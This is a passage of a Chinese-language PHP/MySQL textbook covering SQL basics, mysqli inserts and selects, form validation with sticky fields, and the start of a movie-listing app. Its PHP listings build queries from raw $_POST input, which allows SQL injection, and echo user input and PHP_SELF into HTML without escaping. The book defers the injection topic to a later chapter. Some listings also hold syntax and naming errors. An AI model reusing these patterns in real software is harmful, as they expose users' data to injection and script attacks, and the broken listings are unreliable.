mysql -u testuser -p northwind < northwind.sql
mysql -u testuser -p northwind < northwind-data.sql
```

如果一切正常，按典型的 Unix 方式，我们不会得到任何响应。参见图 12.7。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_121_0.png)

### 基本 SQL 命令

以下各节将演示一些我们将用于处理数据库和表的基本 SQL 命令。

让我们通过在 Bash shell 中输入以下命令重新登录到 MySQL CLI 工具：

```bash
mysql -u testuser -p
```

### 显示数据库

如果我们有兴趣了解可供我们使用的数据库名称，可以输入以下 SQL 命令：

```sql
SHOW DATABASES;
```

我们应该在图 12.8 中看到输出。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_121_1.png)

### 使用数据库

让我们验证我们是否正确导入了 Northwind 数据库。要使用数据库，我们需要发出 SQL 命令表明我们想要使用它。在 mysql> 提示符下输入：

```sql
USE northwind;
```

你应该会看到类似图 12.9 的内容。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_122_0.png)

图 12.9。

### 显示表

我们可以通过发出以下 SQL 命令来显示 northwind 数据库中的所有表：

```sql
SHOW TABLES;
```

你应该会看到类似图 12.10 的输出。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_122_1.png)

图 12.10。

### 描述表

假设我们有兴趣了解 products 表结构的更多信息。我们可以通过发出以下 SQL 命令来描述表中的所有字段（或列）：

```sql
DESCRIBE products;
```

图 12.11 显示了输出。

DESCRIBE 一个表会按顺序显示字段名称、其数据类型以及有关表的其他重要信息。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_122_2.png)

图 12.11。

### 从表中 SELECT

从表中选择数据非常强大，可以让我们根据 SELECT 语句中指定的条件检索表中的行和特定列。

如果我们有兴趣检索 invoices 表中的所有行和列，可以发出以下命令：

```sql
SELECT * FROM invoices;
```

我们将看到如图 12.12 所示包含所有列的表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_123_0.png)

图 12.12。

假设相反，我们想要检索 products 表中的所有行，但我们只想要 id、product_name、list_price 和 reorder_level 列的数据。我们将发出以下命令：

```sql
SELECT id, product_name, list_price, reorder_level FROM products;
```

你应该会看到如图 12.13 和 12.14 所示的可能很长的行列表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_124_0.png)

或者我们可能只想检索与上面相同的信息，但仅限于 reorder level 大于 25 的产品。我们需要使用 WHERE 子句限定要检索的行。我们的查询将如下所示：

```sql
SELECT id, product_name,
list_price, reorder_level
FROM products
WHERE reorder_level > 25;
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_124_1.png)

图 12.15 显示了匹配的行。

我们也可以在 WHERE 子句中添加布尔值以具有多个条件。例如，我们可能只对 reorder_level 大于 20 且小于 100 的产品感兴趣。我们将使用如下查询：

```sql
SELECT id, product_name, list_price, reorder_level
FROM products
WHERE reorder_level > 20 AND reorder_level < 100;
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_124_2.png)

然后在 Bash 中：

```bash
sudo mysql
```

接下来，我们为 FullName 数据库创建用户。

```sql
GRANT ALL PRIVILEGES ON FullName.* TO 'testuser'@'localhost';
FLUSH PRIVILEGES;
exit
```

你的 MySQL 命令行应类似于图 12.17。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_126_0.png)

现在让我们以 testuser 身份重新登录到 MySQL CLI 工具：

```bash
mysql -u testuser -p
```

接下来，让我们创建我们的数据库，我们需要将其命名为 FullName。我们将使用以下 SQL 命令执行此操作：

```sql
CREATE DATABASE FullName;
```

接下来，我们需要使用 FullName 数据库来使用它。

```sql
USE FullName;
```

现在让我们使用以下 CREATE TABLE 命令为我们表中的所有字段创建 fullName 表，使用以下 SQL 命令。你可以全部在一行中输入。CLI 忽略换行并查找 ; 来终止命令。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_126_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_126_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_127_0.png)

```sql
CREATE TABLE fullName (
  id INT NOT NULL AUTO_INCREMENT,
  first_name varchar(20),
  last_name varchar(20),
  PRIMARY KEY (id)
);
```

如果我们描述 fullName 表，我们会得到图 12.21。

```sql
DESCRIBE fullName;
```

### 向表中插入数据

现在我们想要使用我们的表并使用 INSERT INTO SQL 命令插入几个名称：

```sql
INSERT INTO fullName (first_name, last_name) VALUES ('Ken', 'Marks');
INSERT INTO fullName (first_name, last_name) VALUES ('Oscar', 'Merida');
```

我们可以对表中的所有行执行 SELECT 以查看我们插入的内容：

```sql
SELECT * FROM fullName;
```

我们看到图 12.23。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_127_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_127_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_127_3.png)

### 创建 PHP 应用程序以插入数据

PHP 的优点在于它可以轻松地将数据插入到你的 MySQL 数据库中。PHP 提供了几种实现此目的的方法。一种方法是使用 mysqli 函数调用，另一种是 PHP 数据对象（PDO）。PDO 是与数据库交互的更面向对象的方式。对于此示例，我们将使用 mysqli[5] 函数。

让我们取自第 11 章的自引用 postfullname.php 脚本并修改它以将名字和姓氏插入到我们的 FullName 数据库的 fullName 表中。清单 12.1 显示了我们的初始表单。

### 清单 12.1.

```php
1. <html>
2. <head>
3. <title>Form for Entering Full Name</title>
4. </head>
5. <body>
6. <?php if (!isset($_POST['submit'])) { ?>
7. <h2>Enter Full Name</h2>
8. <form action="<?=$_SERVER['PHP_SELF'] ?>" method="POST">
9. First name:<br/>
10. <input type="text" name="first_name"/><br/>
11. Last name:<br/>
12. <input type="text" name="last_name"/><br/>
13. <p>
14. <input type="submit" name="submit" value="Submit Name" />
15. </form>
16. <?php } else { ?>
17. <h2>Greetings!</h2>
18. <p>Hello <?=$_POST['first_name'] . " " . $_POST['last_name'] ?>
19. Thanks for submitting the form!</p>
20. <?php } ?>
21. </body>
22. </html>
```

### 添加代码以将数据插入数据库

在此 else 代码块中：

```php
<?php } else { ?>
<h2>Greetings!</h2>
<p>Hello <?=$_POST['first_name'] . " " . $_POST['last_name'];?>
Thanks for submitting the form!</p>
<?php } ?>
```

[5] mysqli: https://php.net/book.mysqli



你想要做三件事：

- 1. 连接数据库
- 2. 查询数据库
- 3. 关闭数据库连接

在执行这三件事之前，让我们为名字和姓氏创建两个变量：

```
$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
```

### 打开数据库连接

在 else { 语句之后（但在闭合 ?> 之前）我们使用 mysqli_connect()⁶ 函数连接到数据库。该函数默认接受四个字符串参数：host、username、password 和 database_name。我们的 mysqli_connect() 语句应如下所示：

```
$dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
    or trigger_error('Error connecting to MySQL server.', E_USER_ERROR);
```

> 在源代码中以明文形式输入密码并不是一个好主意（尤其是如果我们不小心将其发布到某个 git 仓库）。更好的管理方式是使用配置文件或环境变量。

如果 mysqli_connect() 调用成功，$dbc 将包含指向我们数据库的资源连接。使用 or trigger_error() 语句是个好主意，这样你就可以确定在连接数据库时是否遇到问题。如果失败，你将在网页上看到错误信息，并且 PHP 脚本的执行将停止。

> 为什么不用 or die()？你很可能会遇到使用 die() 语句来停止并显示消息的旧代码或在线旧教程。由于它会停止 PHP 解释器的执行，你的错误信息不会记录到 PHP 的错误日志中，也不会传递给任何自定义错误处理器。此外，通知用户遇到错误的唯一方式就是等待有人报告故障。带有 E_USER_ERROR 级别的 trigger_error() 在没有这些缺点的情况下具有相同的效果。

[6] mysqli_connect(): http://php.net/function.mysqli-connect

## 12. 向 MySQL 数据库插入数据

### 向数据库插入全名

接下来我们想要构建一个 SQL SELECT 查询并使用 mysqli_query() 函数[7]将其发送到数据库。该函数接受两个参数：数据库连接资源和查询字符串。我们的查询字符串和 mysqli_query() 语句应如下所示：

```
$query = "INSERT INTO fullName (first_name, last_name)"
  . " VALUES ('$first_name', '$last_name')";

$result = mysqli_query($dbc, $query);
```

如果 mysqli_query() 调用成功，$result 包含 TRUE。否则，如果查询失败，则返回 FALSE。你也可以同样使用 or trigger_error() 语句。

### 关闭数据库连接

最后，使用 mysqli_close() 函数关闭数据库连接。该函数接受一个参数：数据库连接。我们的 mysqli_close() 语句应如下所示：

```
mysqli_close($dbc);
```

> 每当我们想要查询数据库时，一种方法是连接到数据库、执行查询，然后关闭数据库连接。不要让数据库连接保持打开状态不是一个好主意。它会占用线程资源，如果你有一个大型应用程序同时存在多个打开的连接，则可能成为潜在问题。假设你正在编写一个大型应用程序，该应用程序可能在同一时间有许多打开的数据库连接。在这种情况下，你应该考虑在完成与数据库的交互后关闭连接，而不是等待脚本结束。

> 另一方面，PHP 会在脚本终止时自动关闭任何打开的数据库连接。对于小型到中型的应用程序，或者如果你的查询分布在许多函数中，你可以跳过显式调用 mysqli_close()。

综合起来，我们的脚本现在看起来像列表 12.2。

[7] mysqli_query() function: http://php.net/mysqli_query

### 列表 12.2.

```
```php
<html>
<head>
<title>Form for Entering Full Name</title>
</head>
<body>
<?php if (!isset($_POST['submit'])) { ?>
<h2>Enter Full Name</h2>
<form action="<?=$_SERVER['PHP_SELF']?>" method="POST">
First name:<br/>
<input type="text" name="first_name"/><br/>
Last name:<br/>
<input type="text" name="last_name"/><br/>
<p>
<input type="submit" name="submit" value="Submit Name" />
</form>
<?php } else { ?>
<h2>Greetings!</h2>
<?php
// Grab full name from form
$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];

// Insert full name into database
$dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
or trigger_error('Error connecting to MySQL server.', E_USER_ERROR);

$query = "INSERT INTO fullName (first_name, last_name)"
. " VALUES ('$first_name', '$last_name')";

$result = mysqli_query($dbc, $query);
or trigger_error('Error querying database.', E_USER_WARNING);

if (!$result)
{
trigger_error("Query Error description: "
. mysqli_error($dbc), E_USER_WARNING);
}

mysqli_close($dbc);
?>
<br/><br/>Hello <?= $first_name . " " . $last_name; ?>
Thanks for submitting the form!
<?php } ?>
</body>
</html>
```
```

## 12. 向 MySQL 数据库插入数据

### 测试和验证

### 预期结果

让我们运行我们的应用程序并验证我们是否正确地将项目插入数据库。

如果一切顺利，我们应该得到图 12.25 所示的预期输出。

现在让我们检查一下我们的全名是否确实插入到了 fullName 表中。在 MySQL CLI 工具中，选择 fullName 表中的所有字段和行：

```
SELECT * FROM FullName;
```

根据你的输入，你应该会看到像图 12.26 中那样的一行新记录。

### 成功！

### 可能出现的问题

现在可能会出现一些常见错误，这将阻止你的应用程序成功运行。最常见的问题往往与数据库通信有关。由于 PHP 编码错误导致的错误可以使用标准调试器以及像 Xdebug[8] 这样的工具和像 JetBrains’ PhpStorm 这样的 PHP 集成开发环境（IDE）来找到。

关于数据库通信错误，使用像 Adminer 这样的数据库管理工具或（对于我们的示例）MySQL CLI 工具来验证你的连接参数是否有效是有帮助的。数据库通信错误通常涉及无法连接到数据库或 SQL 查询格式错误。让我们看看这两者。

[8] Xdebug: http://xdebug.org

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_132_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_132_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_132_2.png)

## 创建 PHP 应用程序以插入数据

### 数据库连接失败

无法连接到数据库通常涉及 mysqli_connect() 函数的一个或多个参数不正确，这可能是凭据错误或数据库名称不存在。

例如，你可能会看到像图 12.27 那样的输出。

错误输出可能相当难以解读。然而，我们确实知道我们的 mysqli_connect() 调用失败了。我们还可以看到给出的原因是：

```
php_network_getaddresses: getaddrinfo failed: Name or service not known in
```

我们看到网络地址存在问题这一事实是线索，说明出了什么问题。在 PHP 手册中查找 mysqli_connect()[9] 函数定义，我们看到期望的第一个参数是 SQL 服务器的主机名或 IP 地址。查看我们代码的第 24 行，我们看到图 12.28。

我们很快发现我们输入的是 localhosed 而不是 localhost，这可以快速修复。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_133_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_133_1.png)

假设我们看到图 12.29 中的输出。

给出的原因是：

```
Access denied for user 'testusers'@'localhost'...
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_133_2.png)

因为我们看到访问被拒绝，这告诉我们 mysqli_connect() 的用户名或密码参数不正确。查看我们代码的第 24 行，我们看到图 12.30。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_133_3.png)

查看用户名参数，我们可以看到它拼写错误并且末尾多了一个 s。

[9] mysqli_connect(): https://php.net/mysqli_connect





## 12. 向 MySQL 数据库插入数据

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_134_0.png)

你可能会看到的另一个连接错误如图 12.31 所示。这里给出的原因是：

```
Access denied for user 'testuser'@'localhost' to database 'FullNames'
```

这个错误更有意思，因为它同样给出了访问被拒绝的错误。然而，它并不是拒绝该用户的登录凭据，而只是拒绝访问名为 FullNames 的特定数据库。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_134_1.png)

如果你还记得，我们的数据库名称并不是 FullNames，而是 FullName（单数）。FullNames 并不存在。如果查看我们代码的第 4 行，就会看到图 12.32。

如果我们进入 MySQL CLI 工具，执行 GRANT PRIVILEGES 将 FullNames 中所有表的权限授予 testuser，则会看到不同的错误，如图 12.33 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_134_2.png)

现在，如果我们重新运行 postfullname.php，就会看到图 12.34 中的错误。

这个错误消息告诉我们，我们尝试连接的 FullNames 数据库不存在。这个错误与之前的错误之间有细微的差别。如果用户已被授予访问所有数据库的权限（顺便说一句，这不是一个好主意），那么当数据库不存在时，你就会收到这个错误。而在前一个错误中，无论数据库是否存在，只要用户没有访问权限，就不会尝试连接该数据库。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_134_3.png)

### SQL 查询格式错误

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_135_0.png)

另一个频繁出现的错误是由格式错误的 SQL 查询引起的。在上面的示例中，如果查询字符串中存在错误，我们应该会看到类似图 12.35 所示的错误。

除了我们知道存在查询错误之外，这个信息并没有太大用处。不过，我们可以获取该错误并显示出来。如果在 INSERT 查询下方添加以下代码：

```
if (!$result)
{
    trigger_error("Query Error description: " . mysqli_error($dbc), E_USER_WARNING);
}
```

> 同样，我们使用 trigger_error() 来显示警告。在这种情况下，在将 display_errors 设为 on 的本地站点上，你会看到错误。而在生产站点上，错误会被记入日志，并且不应向用户显示任何内容，因为在该环境中 display_errors 应设为 off。

我们会看到图 12.36 所示的输出。它明确地告诉我们，FullName 数据库中没有名为 fullNames 的表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_135_1.png)

### SQL 注入

这个问题我先留个悬念，稍后会在“安全”章节中讨论。

## 12. 向 MySQL 数据库插入数据

### 练习

- 1. 在你的开发环境中编写本章中的代码示例，并确保它们能正常运行。

## 第 13 章

## 从 MySQL 数据库返回数据

> “有时候，与其把一周剩下的时间都用来调试周一写的代码，还不如周一就待在床上。”
>
> ——克里斯托弗·汤普森

## 13. 从 MySQL 数据库返回数据

在上一章中，我们创建了一个数据库，其中有一个用于保存名和姓的表。在本章中，我们将从该表查询数据，并将其显示在网页上。

如果你还记得，在使用 MySQL CLI 工具时，我介绍过 SQL SELECT 命令，它可以显示表中的所有行：

```
SELECT * FROM fullName;
```

这个查询得到的输出如图 13.1 所示。

在 PHP 中，我们可以使用 mysqli 函数调用来获取数据库查询返回的数据，并编写代码将结果显示在网页上。

我们已经知道如何使用 mysqli_connect() 和 mysqli_query() 连接数据库并执行查询。借助 mysqli_fetch_assoc() 函数，我将展示如何遍历从查询中返回的每一行。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_138_0.png)

### 在 PHP 应用程序中返回数据库行

### 从 fullName 表查询数据

我们知道，如果要显示 fullName 表中所有字段（first_name 和 last_name）的结果，可以使用带 * 的 SQL SELECT 命令：

```
SELECT * FROM fullName;
```

不过，假设我们只想显示 first_name 字段的结果，就需要使用这个查询：

```
SELECT first_name FROM fullName;
```

在 MySQL CLI 工具中测试该查询，我们会看到图 13.2。

我们的 PHP 代码中的查询字符串如下所示：

```
$query = "SELECT first_name FROM fullName";
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_138_1.png)

### 在 PHP 应用程序中返回数据库行

当我们把查询字符串传递给 mysqli_query() 时，这个函数会返回查询结果，因此我们需要将它赋给一个变量：

```
$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database.');
```

$result 变量包含我们的查询结果，也就是 fullName 表中 first_name 字段的所有行。

### 遍历结果集

由于查询结果返回整个结果集，我们需要一种机制来处理结果中的每一行。这正是 mysqli_fetch_assoc() 函数发挥作用的地方。

mysqli_fetch_assoc()[1] 的手册条目指出，该函数返回一个与所获取行对应的关联数组；如果没有更多行，则返回 NULL。所查询表中的字段名是关联数组的键，而值则包含该行中与该键/字段对应的数据。

例如，请看清单 13.1 中的 PHP 代码片段。

### 清单 13.1.

```
1. <?php
2.
3. $dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
4.     or trigger_error('Error connecting to MySQL server.', E_USER_ERROR);
5.
6. $query = "SELECT first_name FROM fullName";
7.
8. $result = mysqli_query($dbc, $query)
9.     or trigger_error('Error querying database.', E_USER_ERROR);
10.
11. // show first row
12. $row = mysqli_fetch_array($result);
13.
14. echo "First Name: <strong>" . $row['first_name'] . "</strong>";
15.
16. // show second row
17. $row = mysqli_fetch_array($result);
18.
19. echo "<br/>First Name: <strong>" . $row['first_name'] . "</strong>";
```

[1] mysqli_fetch_assoc(): http://php.net/mysqli-result.fetch-assoc

## 13. 从 MySQL 数据库返回数据

这段代码产生的输出如图 13.3 所示。

在上面的代码中，紧跟在 mysqli_query() 调用之后的第一次 mysqli_fetch_assoc() 调用会返回表中的第一行。mysqli_fetch_assoc() 的手册条目并未明确指出，后续调用会返回表中的下一行（除非没有更多行）。

因此，如果我们在示例末尾添加以下代码：

```
$row = mysqli_fetch_assoc($result);

echo "<br/>First Name: <strong>" . $row['first_name'] . "</strong>";
?>
```

我们会看到类似图 13.4 的输出。

当表中没有更多行时，函数返回 NULL。我们可以利用这一点，将 mysqli_fetch_assoc() 调用放到一个检查 NULL 的 while 循环中。

所以，如果我想把 fullName 表中的所有名字输出到网页上，可以使用清单 13.2 中的代码。

### 清单 13.2.

```
<?php
$dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
    or trigger_error('Error connecting to MySQL server.', E_USER_ERROR);

$query = "SELECT first_name FROM fullName";

$result = mysqli_query($dbc, $query)
    or trigger_error('Error querying database.', E_USER_ERROR);

while ($row = mysqli_fetch_array($result))
{
    echo "<br/>First Name: <strong>" . $row['first_name'] . "</strong>";
}
```

图 13.5 显示了所产生的输出。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_140_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_140_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_140_2.png)

### 练习：Badlibs 第 2 部分

让我们使用在第 12 章练习中编写的 Badlibs 应用程序，并添加以下功能：

- 1. 创建一个名为 `Badlibs` 的数据库，其中包含一个名为 `badlibs` 的表。
- 2. 在你的 `badlibs` 表中创建以下字段：
  - 一个名为 `id` 的主键，
  - 用于存放名词、动词、形容词和副词的 `varchar` 字段，
  - 以及一个足够长的、名为 `story` 的 `varchar` 字段，用来保存完成后的故事。
- 3. 当用户提交 Badlib 时，将名词、动词、形容词、副词以及构造好的故事插入到数据库中。
- 4. 在表单下方，按从最新到最旧的顺序显示所有故事。

图 13.6 是修改后输出可能外观的示例。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_141_0.png)




## 第14章 验证表单数据并创建粘性字段

> “C 语言古怪、有缺陷，却取得了巨大成功。”
> -Dennis M. Ritchie

## 14. 验证表单数据并创建粘性字段

当创建需要表单数据的 Web 应用程序时，在处理数据之前验证输入的数据至关重要。至少，我们通常希望确保用户已在所有表单字段中输入文本。

同样地，从用户角度来看，如果用户因遗漏某个数据字段而被发回表单，却发现其他字段中输入的数据未被保留，这总是令人烦恼。在这种情况下，我们希望创建粘性字段，以便在需要重新显示表单时用用户的数据填充表单字段。

我们将采用在过去两章中一直在处理的 FullName 应用程序，并为表单条目添加验证和粘性字段。

## 基于验证修改 FullName 行为

当用户打开 FullName 应用程序时，我们只希望在他们在两个字段中都输入文本时才处理名字和姓氏条目。否则，我们希望将用户发回表单。

因此，我们希望添加逻辑，只要任何字段为空就显示表单，并显示适当的错误消息，指出缺少字段需要填写的数据。如果字段验证正确，我们可以向用户输出感谢其提交全名的信息。

让我们开始添加在用户提交表单时或首次导航到此脚本时运行的条件逻辑：

```
<?php
    if (isset($_POST['submit']))
    {
        // ...
    }
    else
    {
        // ...
    }
    // ...
```

接下来创建一个名为 $output_form 的布尔变量，我们可以根据验证的成功与否将其设置为 true 或 false。我们将在 else 子句中将其设置为 true，因为当用户首次导航到此脚本时，我们希望输出 FullName 表单：

```
if (isset($_POST['submit']))
{
    // ...
}
else
{
    $output_form = true;
    // ...
}
// ...
```

## 添加字段验证

如果你还记得，我们将表单变量命名为 first_name 和 last_name：

```
<input name="first_name"/>
...
<input name="last_name"/>
```

在用户提交表单的条件内部，我们将创建几个用于名字和姓氏的变量，如清单 14.1 所示。

### 清单 14.1.

```
1. <?php
2. if (isset($_POST['submit']))
3. {
4.     $first_name = $_POST['first_name'];
5.     $last_name = $_POST['last_name'];
6.     // ...
7. }
8. else
9. {
10.    $output_form = true;
11.    // ...
12. }
```

## 14. 验证表单数据并创建粘性字段

接下来，我们希望添加线性嵌套条件逻辑，测试名字、姓氏或两者是否为空，然后在必要时向用户输出适当的提示信息。参见清单 14.2。

### 清单 14.2.

```
```php
if (isset($_POST['submit']))
{
    $first_name = $_POST['first_name'];
    $last_name = $_POST['last_name'];

    // Validate first and last name fields
    if (empty($first_name) && empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter first name and last name</p>';
        $output_form = true;
    }
    else if (empty($first_name) && !empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter first name</p>';
        $output_form = true;
    }
    else if (!empty($first_name) && empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter last name</p>';
        $output_form = true;
    }
    else
    {
        // Both first name AND last name are filled in, form entry is validated
    }
}
```
```

我们希望在上面的最后一个 else 子句中添加将名字和姓氏插入 FullName 表的代码。然后，我们回显感谢用户提交其全名的消息。现在让我们添加该代码。参见清单 14.3。

### 清单 14.3.

```
```php
else // Both first name AND last name are filled in, form entry is validated
{
    // Insert full name into database
    $dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
        or trigger_error("Error connecting to MySQL server.", E_USER_ERROR);

    $query = "INSERT INTO fullName (first_name, last_name) "
        . "VALUES ('$first_name', '$last_name')";
}
```
```

## 使名字和姓氏字段保持粘性

```
10. $result = mysqli_query($dbc, $query)
11.     or trigger_error('Error querying database.', E_USER_WARNING);
12.
13. if (!$result)
14. {
15.     echo("Query Error description: " . mysqli_error($dbc));
16. }
17.
18. mysqli_close($dbc);
19.
20. echo "<br/><br/>Hello $first_name $last_name Thanks for submitting your full name!";
21.
22. $output_form = false;
23. }
```

上述块中我们应该做的最后一件事是将 $output_form 变量设置为 false，以防止再次输出表单。

## 使名字和姓氏字段保持粘性

让我们回到 if (isset($_POST['submit'])) 之后的 else 块：

```
if (isset($_POST['submit']))
{
    // ...
}
else
{
    $output_form = true;
    // ...
}
```

我们需要将 $first_name 和 $last_name 初始化为空字符串。然后，当用户首次导航到脚本时，空字符串会显示在 first_name 和 last_name 表单字段中：

```
}
else
{
    $output_form = true;
    $first_name = "";
    $last_name = "";
}
```

我们需要做的最后一步是在之前的 else 块之后添加条件代码，如果 $output_form 变量设置为 true 则输出 FullName 表单，并使名字和姓氏字段保持粘性，如清单 14.4 所示。

## 14. 验证表单数据并创建粘性字段

### 清单 14.4.

```
```php
if ($output_form): ?>
<h2>Enter Full Name</h2>
<form action="<?= $_SERVER['PHP_SELF'] ?>" method="POST">
    <div class="form-group">
    <label for="first_name">First Name</label>
    <input class="form-control" id="first_name" name="first_name"
    value="<?= $first_name ?>" placeholder="First Name">
    </div>
    <div class="form-group">
    <label for="last_name">Last Name</label>
    <input class="form-control" id="last_name" name="last_name"
    value="<?= $last_name ?>" placeholder="Last Name">
    </div>
    <button type="submit" class="btn btn-primary"
    name="submit">Submit Name</button>
</form>
<?php endif; ?>
```
```

注意在之前的代码块中，first_name 和 last_name 表单字段的 value 属性会用用户在上一次提交中输入的内容填充，如果验证未通过，我们会重新显示表单。清单 14.5 显示了完整代码的样例。

### 清单 14.5.

```
```php
<?php
if (isset($_POST['submit']))
{
    $first_name = $_POST['first_name'];
    $last_name = $_POST['last_name'];

    // Validate first and last name fields
    if (empty($first_name) && empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter first name and last name</p>';
        $output_form = true;
    }
    else if (empty($first_name) && !empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter first name</p>';
        $output_form = true;
    }
    else if (!empty($first_name) && empty($last_name))
    {
        echo '<p class="text-danger">You forgot to enter last name</p>';
        $output_form = true;
    }
}
```
```

## 使名字和姓氏字段保持粘性

```
```php
23. else
24. {
25.     // Both first name AND last name are filled in, form entry is validated
26.     // Insert full name into database
27.     $dbc = mysqli_connect('localhost', 'testuser', 'testuser', 'FullName')
28.         or trigger_error("Error connecting to MySQL server.", E_USER_ERROR);
29.
30.     $query = "INSERT INTO fullName (first_name, last_name) "
31.         . "VALUES ('$first_name', '$last_name')";
32.
33.     $result = mysqli_query($dbc, $query)
34.         or trigger_error('Error querying database.', E_USER_ERROR);
35.
36.     if (!$result)
37.     {
38.         echo("Query Error description: " . mysqli_error($dbc));
39.     }
40.
41.     mysqli_close($dbc);
42.
43.     echo "<br/><br/>Hello $first_name $last_name Thanks for submitting your full name!";
44.
45.     $output_form = false;
46. }
47. }
48. else
49. {
50.     $output_form = true;
51.     $first_name = "";
52.     $last_name = "";
53. }
54.
55. if ($output_form): ?>
56. <h2>Enter Full Name</h2>
57. <form action="<?= $_SERVER['PHP_SELF'] ?>" method="POST">
58.     <div class="form-group">
59.         <label for="first_name">First Name</label>
60.         <input class="form-control" id="first_name" name="first_name"
61.             value="<?= $first_name ?>" placeholder="First Name">
62.     </div>
63.     <div class="form-group">
64.         <label for="last_name">Last Name</label>
65.         <input class="form-control" id="last_name" name="last_name"
66.             value="<?= $last_name ?>" placeholder="Last Name">
67.     </div>
68.     <button type="submit" class="btn btn-primary"
69.         name="submit">Submit Name</button>
70. </form>
71. <?php endif; ?>
```



## 14. 验证表单数据并创建粘性字段

> 通常，一旦将表单数据保存到数据库中，通常会将用户重定向到单独的确认页面。这样做可以防止用户因刷新页面而意外提交表单。为了简化本示例，我们将所有内容都放在同一个脚本中。

### 使用粘性字段测试我们的脚本

现在我们可以测试 FullName 应用程序的所有用例，以查看我们是否正确验证了表单字段以及字段数据是否保持粘性。

图 14.1 显示了应用程序首次打开时的样子。

当我们不向名字或姓氏字段输入任何内容就提交表单时，应该会看到图 14.2。

请注意，我们重新显示了表单，并收到了正确的错误信息：“您忘记输入名字和姓氏”。

当我们输入名字然后选择提交时，应该会看到类似图 14.3 的内容。

同样，我们显示了表单并收到了正确的错误信息：“您忘记输入姓氏。” 这次我们在提交后名字输入仍然保留——或粘住。

现在让我们从 first_name 字段中删除名字，输入姓氏，然后按 Submit Name。图 14.4 显示了我们应该看到的内容。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_150_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_150_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_150_2.png)

### 练习：联系表单

现在，代码重新显示了表单。我们收到了正确的错误信息：“您忘记输入名字”，并且我们的姓氏输入仍然保留或粘住。

最后，让我们输入名字，保留姓氏，然后选择 Submit Name。我们应该会看到图 14.5。

一旦我们的应用程序成功验证所有字段，并且我们可以将用户的值插入数据库。为了完成交互，我们显示一条消息感谢用户提交其全名。

### 练习：联系表单

- 1. 创建添加表单验证的代码示例。
- 2. 创建使表单字段保持粘性的代码示例。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_151_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_151_1.png)

## 第 15 章 显示项目详情列表

> > “今天的编程是一场竞赛，软件工程师努力构建更大更好的傻瓜式程序，而宇宙则努力制造更大更好的傻瓜。到目前为止，宇宙获胜了。”
> 
> -Rick Cook

## 15. 显示项目详情列表

本章中，我们创建一个基于数据库的电影列表 Web 应用程序，其中包含项目列表，并链接到另一个页面以获取有关电影的更详细信息。在接下来的章节中，我们将向此应用程序添加以下功能等：

- 管理员能够上传新电影
- 能够上传新电影的缩略图
- 用户登录
- 用户可以借阅电影的能力。
- 用户可以归还电影的能力。

### 设计数据库

在思考此应用程序的功能时，我们首先应该考虑需要的数据。由于这是一个包含电影信息的应用程序，我们应该有以下内容：

- title
- rating
- director
- running time
- genre
- (eventually an image)

我们应用程序的打开页面将列出电影，并链接到另一个页面以获取更详细的电影信息。我们可以使用一个表来保存电影数据并将其命名为 `movieListing`。我们将数据库命名为 `Movie`。

在我们的 `movieListing` 表中，我们将有以下列/字段：

- id for the primary key
- title
- rating
- director
- running_time_in_minutes
- genre

### 创建数据库

我们将使用 Adminer 工具创建数据库和表。但是，在此之前，为电影数据库创建一个单独的数据库用户是一个良好且安全的实践。

### 创建单独的数据库用户

我们将使用 MySQL CLI 工具创建一个名为 movieguru 的新用户，并授予其在 Movie 数据库中所有表上的所有权限。

